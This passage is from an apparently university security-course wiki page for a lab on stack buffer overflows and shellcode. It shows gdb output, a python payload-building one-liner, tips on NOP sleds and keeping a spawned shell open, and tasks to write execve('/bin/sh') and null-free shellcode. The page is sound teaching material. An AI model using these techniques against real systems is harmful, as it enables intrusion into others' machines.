+   <span class="nu0">0x804841a</span> &lt;main<span class="sy1">+</span><span class="nu0">10</span>&gt;<span class="sy1">:</span>	<span class="kw1">call</span>   <span class="nu0">0x80482e0</span> &lt;gets@plt&gt;
+   <span class="nu0">0x804841f</span> &lt;main<span class="sy1">+</span><span class="nu0">15</span>&gt;<span class="sy1">:</span>	<span class="kw1">add</span>    <span class="kw4">esp</span><span class="sy1">,</span><span class="nu0">0x4</span>
+=&gt; <span class="nu0">0x8048422</span> &lt;main<span class="sy1">+</span><span class="nu0">18</span>&gt;<span class="sy1">:</span>	<span class="kw1">leave</span>  
+   <span class="nu0">0x8048423</span> &lt;main<span class="sy1">+</span><span class="nu0">19</span>&gt;<span class="sy1">:</span>	<span class="kw1">ret</span>    
+   <span class="nu0">0x8048424</span> &lt;main<span class="sy1">+</span><span class="nu0">20</span>&gt;<span class="sy1">:</span>	<span class="kw1">xchg</span>   <span class="kw4">ax</span><span class="sy1">,</span><span class="kw4">ax</span>
+   <span class="nu0">0x8048426</span> &lt;main<span class="sy1">+</span><span class="nu0">22</span>&gt;<span class="sy1">:</span>	<span class="kw1">xchg</span>   <span class="kw4">ax</span><span class="sy1">,</span><span class="kw4">ax</span>
+   <span class="nu0">0x8048428</span> &lt;main<span class="sy1">+</span><span class="nu0">24</span>&gt;<span class="sy1">:</span>	<span class="kw1">xchg</span>   <span class="kw4">ax</span><span class="sy1">,</span><span class="kw4">ax</span>
+<span class="br0">&#91;</span><span class="sy1">------------------------------------</span><span class="kw5">stack</span><span class="sy1">-------------------------------------</span><span class="br0">&#93;</span>
+<span class="co2">0000</span>| <span class="nu0">0xffffceb8</span> <span class="br0">&#40;</span><span class="st0">&quot;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0004</span>| <span class="nu0">0xffffcebc</span> <span class="br0">&#40;</span><span class="st0">&quot;AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0008</span>| <span class="nu0">0xffffcec0</span> <span class="br0">&#40;</span><span class="st0">&quot;ABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0012</span>| <span class="nu0">0xffffcec4</span> <span class="br0">&#40;</span><span class="st0">&quot;$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0016</span>| <span class="nu0">0xffffcec8</span> <span class="br0">&#40;</span><span class="st0">&quot;AACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0020</span>| <span class="nu0">0xffffcecc</span> <span class="br0">&#40;</span><span class="st0">&quot;A-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0024</span>| <span class="nu0">0xffffced0</span> <span class="br0">&#40;</span><span class="st0">&quot;(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="co2">0028</span>| <span class="nu0">0xffffced4</span> <span class="br0">&#40;</span><span class="st0">&quot;AA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL&quot;</span><span class="br0">&#41;</span>
+<span class="br0">&#91;</span><span class="sy1">------------------------------------------------------------------------------</span><span class="br0">&#93;</span>
+Legend<span class="sy1">:</span> <span class="kw5">code</span><span class="sy1">,</span> <span class="kw5">data</span><span class="sy1">,</span> rodata<span class="sy1">,</span> value
+&nbsp;
+Breakpoint <span class="nu0">1</span><span class="sy1">,</span> <span class="nu0">0x08048422</span> <span class="kw1">in</span> main <span class="br0">&#40;</span><span class="br0">&#41;</span></pre>
+<pre class="code bash">python <span class="re5">-c</span> <span class="st0">&quot;print '<span class="es4">$(./bin_to_hex.sh shell.bin)</span>' + 'A'*(68-12) + '\xb8\xce\xff\xff'&quot;</span> <span class="sy0">&gt;</span> payload</pre>
+
+<p>
+Now test the payload in gdb! Break at <strong>ret</strong> and see the control flow continuing on the stack and executing exit.
+</p>
+
+<p>
+Then try running the experiment outside of gdb. Does it still work? Why or why not?
+</p>
+
+<p>
+In order to circumvent frustration, we&#039;ve leaked the stack address of the buffer in the binary.
+</p>
+
+</div>
+
+<h2 class="sectionedit12" id="tips_tricks">Tips &amp; Tricks</h2>
+<div class="level2">
+
+</div>
+
+<h3 class="sectionedit13" id="loop_forever">Loop forever</h3>
+<div class="level3">
+
+<p>
+Sometimes, you won&#039;t have access to the binary and only have a leaked address of some description. You can add this instruction in your shellcode
+</p>
+<pre class="code asm"><span class="kw1">jmp</span> <span class="nu0">0x0</span></pre>
+
+<p>
+and vary the overwritten return address. If the program stops responding, then it means that it has reached your shellcode.
+</p>
+
+</div>
+
+<h3 class="sectionedit14" id="nop_sled">NOP sled</h3>
+<div class="level3">
+
+<p>
+Stack addresses aren&#039;t always stable. To circumvent is, buffer space permitting, you can inject a large number of &#039;nop&#039; instructions (no operation) prior to the actual shellcode. In this way, if you return to any of the injected nop instructions, the execution flow will reach your shellcode. To better illustrate:
+</p>
+
+<p>
+<a href="../../lib/exe/fetch.php%3Fhash=efe5a5&amp;media=http%253A%252F%252Fphotos1.blogger.com%252Fblogger%252F1619%252F2480%252F1600%252Fbuffer_over5.jpg" class="media" title="http://photos1.blogger.com/blogger/1619/2480/1600/buffer_over5.jpg"><img src="../../lib/exe/fetch.php%3Fhash=efe5a5&amp;media=http%253A%252F%252Fphotos1.blogger.com%252Fblogger%252F1619%252F2480%252F1600%252Fbuffer_over5.jpg" class="media" title="buffer_over5.jpg" alt="buffer_over5.jpg" /></a>
+</p>
+
+</div>
+
+<h3 class="sectionedit15" id="keeping_stdin_open">Keeping stdin open</h3>
+<div class="level3">
+
+<p>
+Your exploit may spawn a shell, and yet it shuts off instantly. That&#039;s because the newly spawned shell isn&#039;t waiting on any input. A workaround to this problem is to append <strong>stdin</strong> to the payload, as follows:
+</p>
+<pre class="code bash"><span class="kw2">cat</span> payload - <span class="sy0">|</span> .<span class="sy0">/</span>vuln</pre>
+
+<p>
+In this way, after the shell spawns, you can interact with it.
+</p>
+
+</div>
+
+<h2 class="sectionedit16" id="tasks">Tasks</h2>
+<div class="level2">
+
+</div>
+
+<h3 class="sectionedit17" id="write_1p">1. write [1p]</h3>
+<div class="level3">
+
+<p>
+Using the same vulnerable binary, write a shellcode which performs the following:
+</p>
+<pre class="code C">write<span class="br0">&#40;</span><span class="nu0">1</span><span class="sy0">,</span> <span class="st0">&quot;Hello World!<span class="es1">\n</span>&quot;</span><span class="sy0">,</span> <span class="nu0">13</span><span class="br0">&#41;</span><span class="sy0">;</span></pre>
+
+<p>
+Again, inspect the Linux x86 ABI.
+</p>
+
+<p>
+<p><div class="notetip">
+If you find yourself running out of shellcode space, remember that there&#039;s plenty of space <em>after</em> the return address <img src="../../lib/images/smileys/icon_wink.gif" class="icon" alt=";-)" />
+
+</div></p>
+</p>
+
+<p>
+<p><div class="notetip">
+You will also need to push the “Hello World!\n” string onto the stack. You can use the following hack in order to do this:
+</p>
+<pre class="code asm"><span class="kw1">call</span> label
+<span class="kw5">db</span> <span class="st0">&quot;Hello World&quot;</span><span class="sy1">,</span> <span class="nu0">0xa</span></pre>
+
+<p>
+The call instruction will push the address of the next “instruction” (in this case, our string), onto the stack.
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit18" id="execve_3p">2. execve [3p]</h3>
+<div class="level3">
+
+<p>
+Now for the real challenge, write a shellcode which actually spawns a shell. The equivalent C call is the following:
+</p>
+<pre class="code C">execve<span class="br0">&#40;</span><span class="st0">'/bin/sh'</span><span class="sy0">,</span> <span class="br0">&#91;</span><span class="st0">'/bin/sh'</span><span class="br0">&#93;</span><span class="sy0">,</span> <span class="nu0">0</span><span class="br0">&#41;</span><span class="sy0">;</span></pre>
+
+<p>
+Where <em>[&#039;/bin/sh&#039;]</em> denotes the <strong>address</strong> of the string &#039;/bin/sh&#039;.
+</p>
+
+<p>
+<p><div class="notetip">
+You need to get the string &#039;/bin/sh&#039; on the stack. You can do this using two <strong>push</strong> instructions. Since the string is 7 bytes long, you can add one more, either &#039;//bin/sh&#039;, or &#039;/bin//sh&#039;.
+
+</div></p>
+<p><div class="notetip">
+You can browse around shellstorm for examples; however, keep in mind that they may not work due to some registers not being set properly.
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit19" id="execve_with_no_zeros_2p">3. execve with no zeros [2p]</h3>
+<div class="level3">
+
+<p>
+Inspect the code of vuln2.asm. What changed? How is your input passed?
+</p>
+
+<p>
+Some functions, such as <strong>strcpy</strong>, <strong>sprintf</strong> and <strong>strcat</strong> stop whenever a NULL byte is reached. If you inspect your previous shellcodes using <strong>xxd</strong>, you will notice that they have plenty of NULL (&#039;0x00&#039;) bytes in them, so your lifelong dream for world domination will be cut short whenever these functions are used.
+</p>
+
+<p>
+However, there&#039;s more than one way <del>to skin a cat</del> to write assembly. Convert your previous shellcode into one that contains no NULLs and use it to exploit <strong>vuln2</strong>.
+</p>
+
+<p>
+<p><div class="notetip">
+<strong>Some common replacements</strong>
+</p>
+<pre class="code asm"><span class="kw1">mov</span> &lt;reg&gt;<span class="sy1">,</span> <span class="nu0">0</span> &lt;<span class="sy1">-</span>&gt; <span class="kw1">xor</span> &lt;reg&gt;<span class="sy1">,</span> &lt;reg&gt;
+<span class="kw1">mov</span> &lt;reg&gt;<span class="sy1">,</span> value &lt;<span class="sy1">-</span>&gt; <span class="kw1">push</span> value<span class="sy1">,</span> <span class="kw1">pop</span> &lt;reg&gt;</pre>
+
+<p>
+
+</div></p>
+</p>
+
+</div>
+
+<h3 class="sectionedit20" id="ending_with_stylepwntools_2p">4. Ending with style: pwntools [2p]</h3>
+<div class="level3">
+
+<p>
+Lastly, let&#039;s use <a href="https://github.com/Gallopsled/pwntools" class="urlextern" title="https://github.com/Gallopsled/pwntools"  rel="nofollow">pwntools</a> to do most of the work for us and exploit <strong>vuln</strong> once more. Fill in the values in <strong>skel_pwn.py</strong> and run the script.
+</p>
+
+</div>
+
+        </div>
+        <div class="right_sidebar">
+          <form action="../../start.html" accept-charset="utf-8" class="search" id="dw__search" method="get"><div class="no"><input type="hidden" name="do" value="search" /><input type="text" id="qsearch__in" accesskey="f" name="id" class="edit" title="[F]" /><input type="submit" value="Search" class="button" title="Search" /><div id="qsearch__out" class="ajax_qsearch JSpopup"></div></div></form>          <div class="namespace_sidebar sidebar_box">
+
+<div><div id="nojs_indexmenu_45055284458355b7a05aef" data-jsajax="%26skipfile%3D%252B/cns%253A%2528sidebar%257Cindex%2529/" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../calendar.html" class="wikilink1" title="cns:calendar">Calendar</a></div></li>
+<li class="level1"><div class="li"><a href="../class-register.html" class="wikilink1" title="cns:class-register">Class Register</a></div></li>
+<li class="level1"><div class="li"><a href="../lab-split.html" class="wikilink1" title="cns:lab-split">Lab Split</a></div></li>
+<li class="level1"><div class="li"><a href="../need-to-know.html" class="wikilink1" title="cns:need-to-know">CNS Need to Know</a></div></li>
+<li class="level1"><div class="li"><a href="../news.html" class="wikilink1" title="cns:news">News</a></div></li>
+<li class="level1"><div class="li"><a href="../rules-and-grading.html" class="wikilink1" title="cns:rules-and-grading">Rules and Grading</a></div></li>
+</ul>
+</div></div>
+
+<h1 class="sectionedit1" id="resources">Resources</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_196033866258355b7a089ce" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../resources/direct.html" class="wikilink1" title="cns:resources:direct">Direct Access</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/documentation.html" class="wikilink1" title="cns:resources:documentation">Documentation</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/feed.html" class="wikilink1" title="cns:resources:feed">RSS Feed</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/mailing-list.html" class="wikilink1" title="cns:resources:mailing-list">Mailing List</a></div></li>
+<li class="level1"><div class="li"><a href="../resources/vm.html" class="wikilink1" title="cns:resources:vm">Virtual Machine</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT1 SECTION "Resources" [104-160] -->
+<h1 class="sectionedit2" id="labs">Labs</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_194721399858355b7a0a934" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="lab-01.html" class="wikilink1" title="cns:labs:lab-01">Lab 01 - Introduction. Basic Exploration Tools</a></div></li>
+<li class="level1"><div class="li"><a href="lab-02.html" class="wikilink1" title="cns:labs:lab-02">Lab 02 - Assembly Language</a></div></li>
+<li class="level1"><div class="li"><a href="lab-03.html" class="wikilink1" title="cns:labs:lab-03">Lab 03 - Executables. Static Analysis</a></div></li>
+<li class="level1"><div class="li"><a href="lab-04.html" class="wikilink1" title="cns:labs:lab-04">Lab 04 - Processes. Dynamic Analysis</a></div></li>
+<li class="level1"><div class="li"><a href="lab-05.html" class="wikilink1" title="cns:labs:lab-05">Lab 05 - The Stack. Buffer Management</a></div></li>
+<li class="level1"><div class="li"><span class="curid"><a href="lab-06.html" class="wikilink1" title="cns:labs:lab-06">Lab 06 - Exploiting. Shellcodes</a></span></div></li>
+<li class="level1"><div class="li"><a href="lab-07.html" class="wikilink1" title="cns:labs:lab-07">Lab 07 - Exploiting. Shellcodes (Part 2)</a></div></li>
+<li class="level1"><div class="li"><a href="lab-08.html" class="wikilink1" title="cns:labs:lab-08">Lab 08 - Exploit Protection Mechanisms</a></div></li>
+<li class="level1"><div class="li"><a href="lab-09.html" class="wikilink1" title="cns:labs:lab-09">Lab 09 - Encryption. Hashing. APIs</a></div></li>
+<li class="level1"><div class="li"><a href="lab-10.html" class="wikilink1" title="cns:labs:lab-10">Lab 10 - Password Breaking</a></div></li>
+<li class="level1"><div class="li"><a href="lab-11.html" class="wikilink1" title="cns:labs:lab-11">Lab 11 - Web Application Security (part 1)</a></div></li>
+<li class="level1"><div class="li"><a href="lab-12.html" class="wikilink1" title="cns:labs:lab-12">Lab 12 - Web Application Security (part 2)</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT2 SECTION "Labs" [161-207] -->
+<h1 class="sectionedit3" id="lectures">Lectures</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_36757912658355b7a0c846" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../lectures/lecture-01.html" class="wikilink1" title="cns:lectures:lecture-01">Lecture 01 - Introduction. Basic Exploration Tools</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-02.html" class="wikilink1" title="cns:lectures:lecture-02">Lecture 02 - Assembly Language</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-03.html" class="wikilink1" title="cns:lectures:lecture-03">Lecture 03 - Executables. Static Analysis</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-04.html" class="wikilink1" title="cns:lectures:lecture-04">Lecture 04 - Processes. Dynamic Analysis. GDB</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-05.html" class="wikilink1" title="cns:lectures:lecture-05">Lecture 05 - The Stack. Buffer Management</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-06.html" class="wikilink1" title="cns:lectures:lecture-06">Lecture 06 - Exploiting. Shellcodes</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-07.html" class="wikilink1" title="cns:lectures:lecture-07">Lecture 07 - Strings</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-08.html" class="wikilink1" title="cns:lectures:lecture-08">Lecture 08 - Integers</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-09.html" class="wikilink1" title="cns:lectures:lecture-09">Lecture 09 - Encryption. Hashing. APIs</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-10.html" class="wikilink1" title="cns:lectures:lecture-10">Lecture 10 - Password Cracking</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-11.html" class="wikilink1" title="cns:lectures:lecture-11">Lecture 11 - Web Application Security (part 1)</a></div></li>
+<li class="level1"><div class="li"><a href="../lectures/lecture-12.html" class="wikilink1" title="cns:lectures:lecture-12">Lecture 12 - Web Application Security (part 2)</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT3 SECTION "Lectures" [208-262] -->
+<h1 class="sectionedit4" id="assignments">Assignments</h1>
+<div class="level1">
+
+<div><div id="nojs_indexmenu_58447652758355b7a0e77e" data-jsajax="" class="indexmenu_nojs">
+
+<ul class="idx">
+<li class="level1"><div class="li"><a href="../assignments/assignment-1.html" class="wikilink1" title="cns:assignments:assignment-1">Assignment 1</a></div></li>
+<li class="level1"><div class="li"><a href="../assignments/assignment-2.html" class="wikilink1" title="cns:assignments:assignment-2">Assignment 2</a></div></li>
+<li class="level1"><div class="li"><a href="../assignments/assignment-3.html" class="wikilink1" title="cns:assignments:assignment-3">Assignment 3</a></div></li>
+</ul>
+</div></div>
+
+</div>
+<!-- EDIT4 SECTION "Assignments" [263-] -->
+</div>
+<div class="toc_sidebar sidebar_box">
+<!-- TOC START -->
+<div id="sb__right__dw__toc">
+<h3 class="toggle">Table of Contents</h3>
+<div>
+
+<ul class="toc">
+<li class="level1"><div class="li"><a href="lab-06.html#lab_06_-_exploiting_shellcodes">Lab 06 - Exploiting. Shellcodes</a></div>
+<ul class="toc">
+<li class="level2"><div class="li"><a href="lab-06.html#resources">Resources</a></div></li>
+<li class="level2"><div class="li"><a href="lab-06.html#lab_support_files">Lab Support Files</a></div></li>
+<li class="level2"><div class="li"><a href="lab-06.html#intro">Intro</a></div></li>
+<li class="level2"><div class="li"><a href="lab-06.html#tutorial_2p">Tutorial [2p]</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-06.html#phase_1recon">Phase 1: Recon</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#phase_2finding_the_vulnerability">Phase 2: Finding the vulnerability</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#phase_3reliable_crash">Phase 3: Reliable crash</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#phase_4writing_the_shellcode">Phase 4: Writing the shellcode</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#phase_5placing_the_shellcode">Phase 5: Placing the shellcode</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#phase_6diverting_control_flow">Phase 6: Diverting control flow</a></div></li>
+</ul>
+</li>
+<li class="level2"><div class="li"><a href="lab-06.html#tips_tricks">Tips &amp; Tricks</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-06.html#loop_forever">Loop forever</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#nop_sled">NOP sled</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#keeping_stdin_open">Keeping stdin open</a></div></li>
+</ul>
+</li>
+<li class="level2"><div class="li"><a href="lab-06.html#tasks">Tasks</a></div>
+<ul class="toc">
+<li class="level3"><div class="li"><a href="lab-06.html#write_1p">1. write [1p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#execve_3p">2. execve [3p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#execve_with_no_zeros_2p">3. execve with no zeros [2p]</a></div></li>
+<li class="level3"><div class="li"><a href="lab-06.html#ending_with_stylepwntools_2p">4. Ending with style: pwntools [2p]</a></div></li>
+</ul></li>
+</ul></li>
+</ul>
+</div>
+</div>
+<!-- TOC END -->
+</div>
+        </div>
+      
+    
+      <div class="stylefoot">
+        <div class="meta">
+          <div class="user">
+                    </div>
+          <div class="doc">
+          cns/labs/lab-06.txt · Last modified: 2016/11/13 21:36 by vladimir.diaconescu          </div>
+        </div>
+      </div>
+
+    <div class="clearer"></div>
+
+    
+                <div class="bar" id="bar__bottom">
+      <div class="bar-left">
+              </div>
+      <div class="bar-right">
+        <a href="lab-06%3Fdo=media&amp;ns=cns%253Alabs.html"  class="action media" rel="nofollow" title="Media Manager">Media Manager</a><a href="lab-06.html#dokuwiki__top"  class="action top" accesskey="t" rel="nofollow" title="Back to top [T]">Back to top</a>      </div>
+    </div>
+    <div class="clearer"></div>
+            
+    <div align="center" class="footerinc">
+  <div class="license"><a href="http://creativecommons.org/licenses/by-sa/3.0/" rel="license"><img src="../../lib/images/license/button/cc-by-sa.png" alt="CC Attribution-Share Alike 3.0 Unported" /></a></div>
+  <a target="_blank" href="http://www.chimeric.de" title="www.chimeric.de"><img src="../../lib/tpl/arctic/images/button-chimeric-de.png" width="80" height="15" alt="www.chimeric.de" border="0" /></a>
+
+  <a target="_blank" href="http://jigsaw.w3.org/css-validator/check/referer" title="Valid CSS"><img src="../../lib/tpl/arctic/images/button-css.png" width="80" height="15" alt="Valid CSS" border="0" /></a>
+
+  <a target="_blank" href="http://wiki.splitbrain.org/wiki:dokuwiki" title="Driven by DokuWiki"><img src="../../lib/tpl/arctic/images/button-dw.png" width="80" height="15" alt="Driven by DokuWiki" border="0" /></a>
+
+  <a target="_blank" href="http://www.firefox-browser.de" title="do yourself a favour and use a real browser - get firefox"><img src="../../lib/tpl/arctic/images/button-firefox.png" width="80" height="15" alt="do yourself a favour and use a real browser - get firefox!!" border="0" /></a>
+  
+  <a target="_blank" href="../../feed.php" title="Recent changes RSS feed"><img src="../../lib/tpl/arctic/images/button-rss.png" width="80" height="15" alt="Recent changes RSS feed" border="0" /></a>
+
+  <a target="_blank" href="http://validator.w3.org/check/referer" title="Valid XHTML 1.0"><img src="../../lib/tpl/arctic/images/button-xhtml.png" width="80" height="15" alt="Valid XHTML 1.0" border="0" /></a>
+</div>
+
+  </div>
+</div>
+
+<div class="no"><img src="../../lib/exe/indexer.php%3Fid=cns%253Alabs%253Alab-06&amp;1479891834" width="2" height="1" alt="" /></div>
+</body>
+</html>
